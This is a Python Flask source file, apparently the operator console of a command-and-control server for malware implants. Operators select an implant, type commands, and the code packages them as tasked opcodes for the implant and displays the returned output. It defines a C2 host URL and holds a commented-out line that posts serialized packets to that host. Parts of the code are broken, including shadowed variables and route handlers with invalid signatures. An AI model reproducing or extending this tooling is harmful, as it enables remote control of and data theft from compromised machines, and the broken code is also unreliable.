from time import sleep
from cvnt.implant_pb2 import TaskRequest, TaskResponse
from flask import Blueprint, session, render_template, redirect, url_for, request
from flask_wtf import FlaskForm 
from wtforms import HiddenField, SelectField, StringField, SubmitField 
from wtforms.validators import DataRequired, Length 
from cvnt.client_pb2 import *
from urllib.parse import urljoin
from cvnt.client_pb2 import  Packet
from cvnt.constants import *
from cvnt.database import db
from cvnt.db_operations import get_task_by_ids, make_task, get_list, get_implant_by_id

term = Blueprint('terminal', __name__, template_folder='templates')
c2 = "https://rigmalwarole.com"
task_list = "/terminal/task/list"
task_create = "/terminal/task/create"
register = "/terminal/register"
request = "/terminal/request"
response = "/terminal/response"
packet = "/terminal/packet"

import random

class Terminal(FlaskForm):
    cmd = StringField('=> ', validators=[DataRequired(), Length(1, 400)])
    selected_implant = SelectField('Select Implant', choices=[], )

@term.route('/terminal', methods=['GET', 'POST'])
def index():
    response = ["Welcome to the party :)"]
    form = Terminal()
    if 'authenticated' not in session or not session['authenticated']:
        return redirect(url_for('basic.login_success'))
    implants = get_list()  # Convert implants to list of tuples
    form.selected_implant.choices = implants  # Set choices for the SelectField
    whole = None
    if form.validate_on_submit():
        if form.selected_implant == 'slayyy':
            response = ["Please Select an Implant"]
        else:
            implant_id = form.selected_implant.data  # Access the selected implant ID
            response = analyze_input(form, implant_id)
    return render_template('terminal.html', form=form, cmd=whole, implants=implants, response=response)

# parses the command inputted into the terminal and handles server request
def analyze_input(form, button_state):
    if button_state == 'slayyy': 
        return ['Please Select an Implant']
    whole = form.cmd.data
    words = whole.split()
    if len(words) == 1:
        if words[0] in server_commands:
            response = get_list()
        elif words[0] in opcodes:
            main_op = OPCODE_STDLIB
            rest_string = str(to_opcode(words[0]))
            new_task = handle_task_request(button_state, main_op, rest_string)
            sleep(5)
            response = new_task.task_output
            response = response.split('\n')
        else:
            response = ["Invalid Command Loser :("]
    else:
        if words[0] in opcodes:
            main_op = OPCODE_STDLIB
            cmd = str(to_opcode(words[0]))
            rest_string = cmd + ''.join(words[1:])
            new_task = handle_task_request(button_state, main_op, rest_string)
            sleep(10)
            response = new_task.task_output
            response = response.split('\n')
        else:
            response = ["Invalid Command Loser :("]
    return response

def handle_local_request(cmd, args):
    pass
    

@term.route('/terminal/task/request', methods=["POST"])
def handle_task_request(implant_id, cmd, args):
    tr = TaskRequest()
    print(f'REQUEST FROM CLIENT')
    tr.TaskID = random.randint(10, 10000)
    tr.Opcode = cmd
    tr.Args = args
    new_task = make_task(implant_id, tr)
    print("NEW TASK MADE:")
    print(new_task)
    db.session.add(new_task)
    print("added task")
    db.session.commit()
    print("committed task")
    return new_task

@term.route(response, methods=["POST"])
def handle_task_response(implant_id, TaskID, output):
    print(f'RESPONSE FROM CLIENT')
    

@term.route(response, methods=["POST"])
def handle_packet(msg, csrf):
    print(f'PACKET FROM CLIENT')
    r = Packet()
    r.Message = msg
    r.CSRF = csrf
    out = r.SerializeToString()
#    r = requests.post(urljoin( c2, csrf), data = out)

